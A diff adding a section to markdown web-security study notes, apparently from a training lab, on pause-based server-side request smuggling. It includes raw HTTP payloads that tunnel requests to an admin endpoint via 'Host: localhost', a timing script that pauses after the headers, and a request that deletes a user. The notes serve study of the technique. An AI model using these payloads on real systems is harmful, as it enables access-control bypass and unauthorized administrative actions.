@@ -538,3 +538,111 @@ Sensitive Request Data Captured
 ```
 
 * **The Security Impact:** Client-side desync can allow an attacker-controlled webpage to manipulate a victim's browser connection and cause unintended requests to be issued. Depending on available gadgets, this can expose session cookies or other authenticated request data and potentially lead to account takeover.
+
+### j. Server-Side Pause-Based Request Smuggling
+
+* **The Objective:** Exploit a pause-based server-side request smuggling vulnerability to desynchronize the frontend and backend, tunnel a request to a restricted administrative endpoint, and perform an unauthorized administrative action.
+
+* **The Mechanism:** The frontend streams requests to the backend, while the backend does not close the connection after timing out on certain endpoints. By sending a request whose body contains another HTTP request and deliberately pausing the connection, the attacker can cause the backend to process the remaining bytes as a separate request after the timeout.
+
+* **Core Layout Structure:**
+
+```http
+POST /resources HTTP/1.1
+Host: target.com
+Cookie: session=YOUR-SESSION-COOKIE
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: CORRECT
+
+GET /admin/ HTTP/1.1
+Host: target.com
+
+```
+
+* **The Front-End View:** The frontend streams the request to the backend and maintains the connection. It considers the embedded `GET /admin/` data to be part of the original request body.
+
+* **The Back-End View:** The backend can time out while waiting for additional data but keep the connection open. When the remaining bytes arrive after the pause, the backend interprets them as a new HTTP request.
+
+* **The Pause-Based Desynchronization:** Unlike traditional CL.TE or TE.CL attacks, the desynchronization is created through **timing**. The attacker pauses the connection at the end of the initial headers, waits for the backend timeout, and then allows the remaining request data to be processed.
+
+* **The Pause Mechanism:**
+
+```python
+def queueRequests(target, wordlists):
+    engine = RequestEngine(
+        endpoint=target.endpoint,
+        concurrentConnections=1,
+        requestsPerConnection=500,
+        pipeline=False
+    )
+
+    engine.queue(target.req, pauseMarker=['\r\n\r\n'], pauseTime=61000)
+    engine.queue(target.req)
+
+def handleResponse(req, interesting):
+    table.add(req)
+```
+
+The important part is that the request is paused after the initial HTTP headers, allowing the backend timeout to occur before the remaining bytes are sent.
+
+* **The CL.0 Relationship:** This technique can be viewed as a **pause-based CL.0 desynchronization**. The backend effectively fails to consume the expected request body before the connection is reused, allowing the remaining bytes to become a new request.
+
+* **The Host Manipulation:** If the backend restricts administrative functionality based on the request's `Host` header, the tunnelled request can use an internal hostname such as:
+
+```http
+GET /admin/ HTTP/1.1
+Host: localhost
+```
+
+This can cause the backend to treat the request as originating from a trusted local context.
+
+* **The Administrative Request:** Once access to the administrative functionality is obtained, the same pause-based tunnel can be used to send a second request containing the required parameters, such as a CSRF token and target username:
+
+```http
+POST /resources HTTP/1.1
+Host: target.com
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: CORRECT
+
+POST /admin/delete HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: CORRECT
+
+csrf=YOUR-CSRF-TOKEN&username=carlos
+```
+
+* **The Pause Marker:** When multiple requests contain `\r\n\r\n`, the pause marker should identify the end of the **outer request's headers** rather than every header boundary. This ensures that the deliberate delay occurs at the intended point in the request sequence.
+
+* **Core Conceptual Flow:**
+
+```text
+Attacker
+   |
+   |  Initial request
+   v
+Frontend
+   |
+   |  Streams request
+   v
+Backend
+   |
+   |  Waits for body
+   |  Times out but keeps connection open
+   v
+Pause
+   |
+   |  Remaining bytes sent
+   v
+Backend interprets bytes as new request
+   |
+   v
+Restricted Endpoint
+   |
+   v
+Administrative Action
+```
+
+* **The Security Impact:** Pause-based request smuggling can bypass protections that prevent traditional request smuggling by avoiding the need for a persistent frontend-to-backend connection reuse pattern. It can lead to unauthorized access to internal or administrative endpoints, authentication or access-control bypasses, and unauthorized actions against application users.
